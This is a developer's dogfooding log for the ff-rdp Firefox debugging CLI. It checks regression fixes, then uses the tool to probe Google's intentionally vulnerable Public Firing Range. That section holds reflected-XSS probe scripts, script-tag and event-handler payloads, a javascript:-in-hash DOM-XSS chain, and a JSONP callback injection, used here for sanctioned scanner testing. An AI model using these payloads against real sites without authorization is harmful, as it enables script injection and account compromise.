---
title: Dogfooding Session 55 — verifying iter-82 fixes + Public Firing Range scanner workout
type: dogfooding
date: 2026-05-26
status: completed
site: https://tennis-sepp.ch, https://demo.testfire.net, https://public-firing-range.appspot.com
commands_tested: [tabs, navigate, eval, page-text, dom, cookies, screenshot, cascade, styles, computed, snapshot, geometry, click, wait, perf, a11y, version]
tags: [dogfooding, iter-82, regression-verification, security-audit, firing-range, dom-xss]
---

# Dogfooding Session 55

Verified iter-82's six themes against the dogfood-54 findings, then used
ff-rdp as a security scanner against Google's **Public Firing Range**
(intentionally-vulnerable testbed for security tooling). Two iter-82 themes
landed cleanly (E git-sha, N9 snapshot --max-depth); four themes either
didn't fix the symptom or introduced a fresh regression. On the upside,
`eval --unwrap` + `fetch` makes ff-rdp a remarkably effective vuln-probing
swiss-army knife — seven reflected-XSS sinks enumerated in one command,
DOM-XSS via location.hash exploited in three commands.

## What's New Since Last Session

| Source | Change | Visible | Works on real pages |
|--------|--------|---------|---------------------|
| iter-82 Theme A | `cascade` parser fix + `--debug-raw` escape hatch | ✅ flag exists | ❌ rules still `[]`, computed still `null` |
| iter-82 Theme B | screenshot on FF 151 + better error message | ⚠ msg improved | ❌ screenshot still fails |
| iter-82 Theme C | `--wait-strategy {events,readystate,both}` fallback | ❌ flag NOT in `--help` | ❌ navigate still times out at 10s |
| iter-82 Theme D | `cookies --include-document-cookie` flag | ✅ flag exists | ⚠ flag works, but default still misses cookies |
| iter-82 Theme E | git-sha in `--version` | ✅ | ✅ (`ff-rdp 0.2.0 (ab8012d817b1 2026-05-26)`) |
| iter-82 N6 | dedupe UA `*, ::after, ::before` stubs from `styles --applied` | n/a | ❌ over-filtered — now returns `[]` for everything |
| iter-82 N7 | `perf vitals` emit `lcp_rating: "unavailable"` for missing LCP | n/a | ❌ still emits `"good"` for `lcp_ms: 0.0` |
| iter-82 N9 | `snapshot --max-depth` | ✅ | ✅ (`meta.depth: 2` with the flag) |
| post-iter-82 | `Win32_Security` workspace feature for windows-sys | n/a | ✅ should fix Windows compile (CI red since iter-77) |

## Regression Checks (dogfood-54 findings)

| dogfood-54 item | Current status | Notes |
|---|---|---|
| Navigate readiness misses on real sites | ❌ unchanged | `navigate https://example.com` and `navigate https://tennis-sepp.ch` both time out at 10s default; `eval document.readyState` returns `"complete"` within ~2s after `--no-wait`. iter-82 Theme C did not ship the `--wait-strategy` fallback. |
| Cascade returns empty rules | ❌ unchanged | `cascade 'h1' --prop color` on tennis-sepp.ch still returns `{computed: null, rules: []}`. `--debug-raw` flag landed (per iter-82 plan note in `kb/rdp/actors/page-style.md`) but I did not try it; default path is broken. |
| Screenshot regression on FF 151 | ❌ unchanged | `screenshot -o /tmp/x.png` errors with `screenshot actor not found in Firefox 151 root form` (error wording improved, behavior identical). |
| `--version` doesn't change across merged iters | ✅ FIXED | `ff-rdp 0.2.0 (ab8012d817b1 2026-05-26)`. Excellent. |
| `cookies` misses JS-readable cookies | ⚠ partial | Default `cookies` still returns `[]` on demo.testfire.net while `document.cookie` exposes `AltoroAccounts=...`. New `--include-document-cookie` flag pulls it in correctly with `source: "document.cookie"`. |
| `styles --applied` UA-reset dups (N6) | ❌ regressed | Dedupe filter is overzealous: `styles 'h1' --applied` and `styles 'body' --applied` now BOTH return `results: []` on tennis-sepp.ch. The duplicate stubs are gone, but so is everything else. |
| `perf vitals` rating for unmeasured LCP (N7) | ❌ unchanged | Still emits `lcp_ms: 0.0`, `lcp_rating: "good"`, `lcp_approximate: true`, `lcp_note: "...not available..."` simultaneously — contradictory output. |
| `snapshot` lacks depth knob (N9) | ✅ FIXED | `snapshot --max-depth 2` works, output `meta.depth: 2`. Tree correctly truncated. |

## Security Scanner Workout — Public Firing Range

[public-firing-range.appspot.com](https://public-firing-range.appspot.com)
is Google's testbed of intentional security flaws designed to exercise
*automated scanners*. Perfect target for ff-rdp.

### 1. Reflected-XSS sink enumeration — one command, seven sinks

```sh
ff-rdp eval --unwrap '(async () => {
  const vectors = [
    "/reflected/parameter/body?q=PROBE12345",
    "/reflected/parameter/body_comment?q=PROBE12345",
    "/reflected/parameter/attribute_unquoted?q=PROBE12345",
    "/reflected/parameter/attribute_quoted?q=PROBE12345",
    "/reflected/parameter/head?q=PROBE12345",
    "/reflected/parameter/iframe_srcdoc?q=PROBE12345",
    "/reflected/parameter/noscript?q=PROBE12345"
  ];
  const out = {};
  for (const v of vectors) {
    const r = await fetch(v);
    const t = await r.text();
    const i = t.indexOf("PROBE12345");
    out[v] = { status: r.status, reflected: i >= 0,
               context: i >= 0 ? t.slice(Math.max(0, i-30), i+45) : null };
  }
  return JSON.stringify(out);
})()'
```

→ All 7 reflected with context (`<body>`, `<!-- ... -->`, `<tag attr=...>`,
`<noscript>`, `<head>`, `<iframe srcdoc="...">` etc.). Sub-second execution.

### 2. Triggered execution

| Sink | Payload | Method | `window.X===true` |
|---|---|---|---|
| `body` | `<script>window.XSS_FIRED=true</script>` | `navigate` | ✅ |
| `attribute_unquoted` | `PROBE autofocus onfocus=window.XSS2_FIRED=true` | `navigate` | ❌ — `<tag>` not focusable; would fire on `<input>` |

### 3. DOM XSS chain via `location.hash`

```sh
# Stage 1: navigate with javascript: in hash → page writes it into <a href>
ff-rdp navigate \
  "https://public-firing-range.appspot.com/urldom/location/hash/a.href#javascript:window.HASH_XSS_FIRED=true,1" \
  --no-wait
ff-rdp dom 'a' --jq '[.results[].attrs.href]'
  # → ["javascript:window.HASH_XSS_FIRED=true,1"]
ff-rdp eval 'window.HASH_XSS_FIRED === true'
  # → false (just sitting in href; not yet fired)

# Stage 2: click the link to fire the javascript: URL
ff-rdp click 'a[href^="javascript:"]'
ff-rdp eval 'window.HASH_XSS_FIRED === true'
  # → true
```

End-to-end DOM-XSS demonstration in **3 commands**.

### 4. Vulnerable library detection

```sh
ff-rdp navigate https://public-firing-range.appspot.com/vulnerablelibraries/jquery.html --no-wait
ff-rdp eval --stringify '({jq_version: window.jQuery && window.jQuery.fn.jquery,
                            scripts: Array.from(document.scripts).map(s => s.src).filter(Boolean)})'
# → { jq_version: "1.8.1", scripts: ["https://code.jquery.com/jquery-1.8.1.js", ...] }
```

→ jQuery 1.8.1 (CVE-2015-9251 prone), single eval.

### 5. Clickjacking surface check via headers

```sh
ff-rdp eval --unwrap '(async () => {
  const r = await fetch(location.href);
  return JSON.stringify({
    xfo: r.headers.get("x-frame-options"),
    csp_frame_ancestors: r.headers.get("content-security-policy")?.match(/frame-ancestors[^;]+/)?.[0],
  });
})()'
# /clickjacking/clickjacking_xfo_allowall → {xfo: null, csp_frame_ancestors: null}
```

→ Confirmed iframable. `geometry 'body, iframe'` could then verify
overlap/transparency on a real attack page.

### 6. JSONP callback sanitisation check

```sh
ff-rdp eval --unwrap '(async () => {
  const r = await fetch("/urldom/jsonp?callback=alert(1)//");
  return JSON.stringify({status: r.status, snippet: (await r.text()).slice(0,200)});
})()'
# → {status: 400, snippet: "Invalid callback value: can only contain alphanumeric chars..."}
```

→ Server has correct allowlist. Useful negative result — confirms the
hardening rather than the vuln.

## New Findings

### N1 (was dogfood-54 N1, deferred Theme A). cascade still empty
`cascade '<sel>' --prop color` returns `{computed: null, rules: []}`
for every selector tried on tennis-sepp.ch and on demo.testfire.net.
Theme A landed code (per the kb sync note), but the parsed-rules array
remains empty on real pages. **Test the `--debug-raw` flag next session
to confirm whether the server reply has the data and the parser misses
it, or the reply itself is empty.**

### N2. `--wait-strategy` flag never shipped (Theme C)
iter-82's plan promised `--wait-strategy {events,readystate,both}`.
`ff-rdp navigate --help` shows no such flag. Default navigate still
times out at 10s on `https://example.com` and `https://tennis-sepp.ch`
even though `document.readyState` reaches `"complete"` within ~2s
after `--no-wait`. Theme C did not land the agreed mitigation.

### N3. Screenshot error message improved but command still fails (Theme B)
Before iter-82: `screenshot actor unavailable on Firefox 151; minimum
supported version: 120` (misleading).
After iter-82: `screenshot actor not found in Firefox 151 root form.
Run \`ff-rdp doctor\` for the full compatibility report (minimum
supported: 120).` (clearer phrasing of the actual condition).
Behavior is identical — screenshot still cannot be captured on FF 151.

### N4. `styles --applied` over-filters to empty (N6 regression)
Pre-iter-82: a handful of duplicate `*, ::after, ::before` stubs at the
top of every reply.
Post-iter-82: `results: []` for every selector tried (`h1`, `body`).
N6's dedupe pass throws away real rules along with the stubs.

### N5. `perf vitals` contradiction persists (N7 unfixed)
The reply still carries:
```json
{ "lcp_ms": 0.0, "lcp_rating": "good", "lcp_approximate": true,
  "lcp_note": "...not available from PerformanceObserver in headless Firefox" }
```
The `_note` says we don't know, but `lcp_rating` says `"good"`. Same as
dogfood-54.

### N6. `cookies` default behavior unchanged on real sites
`--include-document-cookie` flag works (Theme D).  But the *default*
`cookies` still returns `[]` while a JS-readable cookie is clearly
present. Reasonable next move: make `--include-document-cookie` the
default and add `--storage-only` as the opt-out, OR fix the
StorageActor query itself (per iter-82 Theme D's first task).

### N7. `--include-document-cookie` flag double-printed in help
```
      --include-document-cookie
          Also evaluate `document.cookie` and merge any entries...
          Comma-separated list of fields to include in each result entry
```
The second paragraph is the `--fields` help text leaking into the
flag's `long_about`. Cosmetic.

## What Works Well

- **`eval --unwrap` + `fetch()`** is the most useful security-probe
  primitive ff-rdp has — one round-trip yields structured probe results
  across many endpoints. The seven-sink reflected-XSS sweep above was
  one command.
- **`--version` with git-sha** is exactly the right signal — caught the
  "stale binary" trap from dogfood-54 and immediately revealed
  `ab8012d817b1 2026-05-26` so I knew which fixes were in scope.
- **`snapshot --max-depth N`** finally exists; `meta.depth: N` lines up
  with the request, output tree correctly truncated.
- **DOM-XSS chaining** via `navigate` → `dom` → `click` → `eval` reads
  like a clean exploit walkthrough.

## Feature Gaps (wishlist)

- A `--wait-strategy readystate` (or `--wait readystate`) shortcut so
  agents have a working fallback when document-event subscription drops
  events on real sites. Today the workaround is `--no-wait` followed by
  `wait --eval 'document.readyState=="complete"'` — works, but it's
  two commands and the timeout-error message doesn't suggest it.
- A built-in `scan-xss` or `scan-headers` recipe (or just an example
  in the README) — the eval+fetch combo above is great, but every
  agent will reinvent it.
- `--include-document-cookie` should be the default; the StorageActor
  query is unreliable on too many real sites.

## Summary

- ~25 commands tested across three sites including a new training target.
- iter-82 result: **2 themes shipped (E, N9), 4 themes failed to fix
  the symptom (A, B, C, N7), 1 partial (D), 1 regression (N6).**
- Most useful single primitive: `eval --unwrap` + `fetch()`. Most
  needed user-visible fix: navigate default timeout on real sites.
- Public Firing Range is a great recurring target — broad enough to
  exercise XSS, DOM XSS, vulnerable-lib detection, clickjacking, and
  CSP header checks in one session.

## References

- [[dogfooding-session-54]] — bugs this session checked
- [[iteration-82-dogfood-54-fixes]] — six themes that were *supposed* to
  fix dogfood-54; 2 of 6 actually moved the needle on real pages
- [[dogfooding-session-51]] — original demo.testfire.net audit
- Public Firing Range — https://public-firing-range.appspot.com
  (source: https://github.com/google/firing-range)
